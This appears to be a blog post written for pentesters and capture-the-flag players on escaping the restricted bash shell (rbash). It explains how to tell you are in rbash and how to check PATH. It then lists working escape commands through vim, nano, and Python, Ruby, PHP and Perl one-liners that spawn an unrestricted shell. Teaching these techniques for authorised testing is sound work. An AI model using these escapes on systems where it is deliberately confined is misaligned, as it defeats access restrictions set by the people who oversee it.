+++
title = "Escaping Rbash"
date = 2020-07-03T09:26:30-04:00
description = "Escaping a restricted shell on pentests or CTFs"
draft = false
tags = [
    "shell",
]
categories = [
    "ctf",
]
+++
This article discusses the possible methods for escaping a restricted shell environment and how to escalate to a shell with more privileges.

## What is rbash?
rbash - also known as The Restricted Shell - is a linux shell that has some restricted features when compared to bash. Some of the features that rbash prevents are as follows:
 * [*]Redirecting command output
 * [*]Changing variables such as SHELL, PATH, ENV, etc. 
 * [*]Certain binaries specified by the user who created the rbash environment
 
 You can find the full list and more information on [GNU's rbash reference manual](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)

## Determining if you're in rbash
You can easily check your current shell using echo:

{{< highlight bash >}}
$ echo $SHELL
/bin/rbash
{{< /highlight >}}


If you see rbash, rzsh, lshell, or something similar (look it up if you aren't sure) then you're in a restricted shell. 

## Check your PATH

Because you're in a restricted shell, you'll probably wont have many commands to work with. By viewing which directories are in your PATH, you might be able to escape rbash very quickly. You can check to see the items in your path by running:

{{< highlight bash >}}
echo $PATH
{{< /highlight >}}

If you see /bin in your PATH, that means you can run bash to escape rbash instantly:

{{< highlight bash >}}
/bin/bash -i
{{< /highlight >}}

It is unlikely that you'll have /bin in your PATH, but it's always worth it to check!

## Text Editors
Hopefully you'll have the ability to use a text editor of some kind in your restricted shell. If so, you can escape them to enter a unrestricted shell. Here are a few examples:

#### Vim
Open vim, and run the following command:

{{< highlight bash >}}
:!/bin/bash
{{< /highlight >}}

#### Nano
Nano can be escaped in a similar way, but requires some keyboard shortcuts to get to the command input (Note: ^R refers to holding CTRL and pressing R).
Once in nano, use the following shortcuts and commands:

{{< highlight bash >}}
^R^X
reset; sh 1>&0 2>&0
{{< /highlight >}}

## Programming Languages
If you have access to programming languages in your restricted shell, you can use them to your advantage to spawn better unrestricted shells! Note: You can also use these commands to improve foothold shells. 

#### Python
{{< highlight bash >}}
python -c "import pty;pty.spawn('/bin/bash')"
{{< /highlight >}}

#### Ruby
{{< highlight bash >}}
ruby -e 'exec "/bin/sh"'
{{< /highlight >}}

#### PHP
{{< highlight bash >}}
export CMD="/bin/sh"
php -r 'system(getenv("CMD"));'
{{< /highlight >}}

#### Perl
{{< highlight bash >}}
perl -e 'exec "/bin/sh";'
{{< /highlight >}}

## Other Binaries
There are MANY more binaires that you can use to escape your restricted shells. You can find an extensive list of them tagged with "Shell" on [GTFOBins](https://gtfobins.github.io/#+shell)
